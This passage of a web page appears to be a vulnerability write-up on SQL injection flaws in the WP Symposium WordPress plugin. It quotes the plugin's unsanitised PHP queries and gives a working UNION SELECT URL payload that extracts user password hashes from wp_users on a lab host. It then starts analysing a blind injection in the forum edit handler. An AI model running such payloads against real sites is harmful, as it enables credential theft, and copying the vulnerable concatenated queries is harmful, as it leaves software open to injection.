class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-i">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-26">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-28">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// resolve stubs if using WPS permalinks</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_permalink_structure'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">'/'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">get_query_var</span><span class="crayon-sy">(</span><span class="crayon-s">'stub'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stubs</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">stub0</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-34">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE replace(display_name, ' ', '') = %s"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">stub0</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">last_query</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-44">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_symposium_meta</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'share'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'UID:'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;/div&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-48">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'public'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-50">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">user</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0173 seconds] -->
+<p>Note that the last line takes the $uid variable as determined on the first block of code, and simply puts it straight into the query without any sort of input sanitation. So by creating a page with the &#8220;[symposium-profile-menu]&#8221; short-tag, we can inject into the page with a simple URL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efef7903245300" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+http://192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efef7903245300-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efef7903245300-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0006 seconds] -->
+<p><strong>Analysis of forum updateEditDetail blind SQL injection vulnerability</strong></p>
+<p>This vulnerability is actually more like 2. We can see that in this standard ajax call in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_forum_functions.php">/ajax/symposium_forum_functions.php</a> file that there is a total of 4 SQL queries executed, 2 updates and 2 selects. Notice that the $_POST parameters aren&#8217;t sanitized before use, yet all but the 3rd query uses concatenation to create the SQL query, which creates SQL injection conditions if you are logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785eff06249362923" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+// AJAX function to update topic details after editing
+if ($_POST['action'] == 'updateEditDetails') {
+
+	if (is_user_logged_in()) {
+
+		$tid = $_POST['tid'];	
+
+		$topic_subject = $_POST['topic_subject'];	
+		$topic_post = $_POST['topic_post'];
+
+		if (get_option('symposium_striptags') == 'on') {
+			$topic_subject = strip_tags($topic_subject);	
+			$topic_post = strip_tags($topic_post);	
+		}
+
+		$topic_post = str_replace("\n", chr(13), $topic_post);	
+		$topic_category = $_POST['topic_category'];
+
+		// Ensure safe HTML
+		$topic_subject = str_replace("&lt;", "&amp;lt;", $topic_subject);	
+		$topic_subject = str_replace("&gt;", "&amp;gt;", $topic_subject);	
+		if (get_option('symposium_use_wysiwyg') != 'on') {
+			$topic_post = str_replace("&lt;", "&amp;lt;", $topic_post);	
+			$topic_post = str_replace("&gt;", "&amp;gt;", $topic_post);
+		}
+
+		if ($topic_category == "") {
+			$topic_category = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_category FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));
+		}
+
+		$wpdb-&gt;query( $wpdb-&gt;prepare("UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_category = ".$topic_category." WHERE topic_parent = ".$tid) );
+
+		$sql = "UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d";
+		$wpdb-&gt;query( $wpdb-&gt;prepare($sql, $topic_subject, $topic_post, $topic_category, $tid) );
+
+		$parent = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_parent FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));
+
+	}
+
+	exit;
+}</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1644">1644</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1645">1645</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1646">1646</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1647">1647</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1648">1648</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1649">1649</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1650">1650</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1651">1651</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1652">1652</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1653">1653</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1654">1654</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1655">1655</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1656">1656</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1657">1657</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1658">1658</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1659">1659</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1660">1660</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1661">1661</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1662">1662</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1663">1663</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1664">1664</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1665">1665</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1666">1666</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1667">1667</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1668">1668</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1669">1669</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1670">1670</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1671">1671</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1672">1672</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1673">1673</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1674">1674</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1675">1675</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1676">1676</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1677">1677</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1678">1678</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1679">1679</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1680">1680</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1681">1681</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1682">1682</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785eff06249362923-1683">1683</div><div class="crayon-num" data-line="crayon-53c98785eff06249362923-1684">1684</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785eff06249362923-1644"><span class="crayon-c">// AJAX function to update topic details after editing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1645"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'updateEditDetails'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1646">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1647"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1648">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1649"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$tid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'tid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1650">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1651"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_subject'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1652"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_post'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1653">&nbsp;</div><div class="crayon-line" id="crayon-53c98785eff06249362923-1654"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_striptags'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1655"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1656"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1657"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1658">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1659"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1660"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_category'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1661">&nbsp;</div><div class="crayon-line" id="crayon-53c98785eff06249362923-1662"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Ensure safe HTML</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1663"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785eff06249362923-1664"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785eff06249362923-1665"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_use_wysiwyg'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" 